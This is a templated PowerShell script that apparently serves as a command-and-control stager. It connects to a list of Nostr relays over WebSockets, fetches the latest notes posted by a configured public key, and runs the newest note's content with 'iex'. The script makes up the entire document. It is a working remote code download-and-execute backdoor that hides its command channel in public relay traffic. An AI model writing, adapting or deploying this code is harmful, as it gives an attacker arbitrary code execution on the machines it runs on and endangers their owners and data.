$Relays = @(
{% for relay in relays %}
    "{{ relay }}"{% if not loop.last %},{% endif %}
{% endfor %}
)

$PublicKey = "{{ publickey }}"

foreach ($Relay in $Relays) {
    $ws    = New-Object System.Net.WebSockets.ClientWebSocket
    $uri   = [Uri]$Relay
    $subId = "arbit_sub"

    try {
        $ws.ConnectAsync($uri, [Threading.CancellationToken]::None).Wait()

        $request = @(
            "REQ",
            $subId,
            @{
                authors = @($PublicKey)
                kinds   = @(1)
                limit   = 5
            }
        ) | ConvertTo-Json -Compress -Depth 10

        $sendBytes = [Text.Encoding]::UTF8.GetBytes($request)

        $ws.SendAsync(
            [ArraySegment[byte]]::new($sendBytes),
            [System.Net.WebSockets.WebSocketMessageType]::Text,
            $true,
            [Threading.CancellationToken]::None
        ).Wait()

        $messages = @()
        $deadline = (Get-Date).AddSeconds(5)

        while ((Get-Date) -lt $deadline) {
            $buffer = New-Object byte[] 65536
            $cts = New-Object Threading.CancellationTokenSource
            $cts.CancelAfter(1000)

            try {
                $result = $ws.ReceiveAsync(
                    [ArraySegment[byte]]::new($buffer),
                    $cts.Token
                ).Result

                $text = [Text.Encoding]::UTF8.GetString($buffer, 0, $result.Count)
                $json = $text | ConvertFrom-Json

                if ($json[0] -eq "EVENT") {
                    $messages += $json[2].content
                }
            }
            catch {
                # timeout/no message
            }
            finally {
                $cts.Dispose()
            }
        }

        if ($messages.Count -gt 0) {
            iex $messages[-1]
            break
        } else {
            Write-Host "No messages received from $Relay."
        }
    }
    catch {
        Write-Host "Relay failed: $Relay"
    }
    finally {
        $ws.Dispose()
    }
}